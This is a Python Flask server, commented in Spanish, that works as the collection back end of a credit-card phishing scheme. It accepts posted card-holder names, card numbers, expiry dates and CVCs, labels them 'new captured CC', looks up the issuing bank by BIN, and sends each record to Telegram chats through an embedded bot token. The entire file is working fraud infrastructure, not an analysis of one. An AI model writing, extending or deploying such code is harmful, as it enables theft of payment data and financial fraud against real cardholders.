import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
LISTA_DE_RECEPTORES = ['6953415010', '7707049896']

# --- MOTOR DE BÚSQUEDA MULTI-API (CASCADA) ---
def get_bank_info(card_number):
    bin_number = card_number[:6]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    # --- INTENTO 1: BINLIST.NET ---
    try:
        print(f"🔍 Intentando API 1 (Binlist) para BIN: {bin_number}")
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            type_card = data.get('type', 'DESCONOCIDO').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            return f"{bank} | {type_card} | {country}"
    except:
        pass

    # --- INTENTO 2: BINLIST ALTERNATIVA (Vía proxy/reintento) ---
    try:
        print(f"🔄 API 1 falló. Intentando API 2 (Fallback)...")
        # Usamos un endpoint alternativo si existiera o simplemente reintentamos con otro header
        res = requests.get(f"https://lookup.binlist.net/{bin_number}", headers=headers, timeout=4)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Desconocido')
            return f"{bank} | {data.get('type', 'DESCONOCIDO').upper()}"
    except:
        pass

    # --- INTENTO 3: BÚSQUEDA POR FUENTE DE DATOS ABIERTA (SIMULADA/ESTÁTICA) ---
    # Nota: En un entorno profesional, aquí conectarías una API de pago como MaxMind o similares.
    # Por ahora, si las gratuitas fallan, devolvemos un mensaje de error limpio.
    
    return "🏦 Banco: No disponible (API saturada)"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    target_id = str(data.get('target_id'))

    if target_id not in LISTA_DE_RECEPTORES:
        return jsonify({"status": "ignored"}), 200

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # CONSULTA EL BANCO CON EL MOTOR DE CASCADA
    print(f"🚀 Iniciando búsqueda de banco para: {tarjeta[:6]}")
    info_banco = get_bank_info(tarjeta)

    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload, timeout=5)
            if res.status_code == 200: exitos += 1
        except: continue

    print(f"🏁 Finalizado. Enviados a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
